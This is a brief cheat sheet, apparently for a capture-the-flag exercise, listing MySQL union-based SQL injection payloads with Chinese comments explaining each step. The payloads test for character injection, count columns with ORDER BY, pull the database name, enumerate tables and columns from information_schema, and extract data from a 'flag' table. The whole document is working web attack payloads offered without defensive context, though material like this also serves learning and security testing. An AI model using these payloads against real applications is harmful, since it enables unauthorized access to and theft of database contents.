# sql_Injection

```mysql
1‘ and '1'='1#   #字符注入

1' order by 1#   #知道选择语句的字段数1

1' union select database()#       #知道数据库名
1' union select group_concat(table_name) from information_schema.tables where table_schema=database()#    #知道数据库里的表
1' union select group_concat(column_name) from information_schema.columns where table_name='flag'#   #知道表中的字段名
1' union select flag from flag#   #获得字段中的数据
```

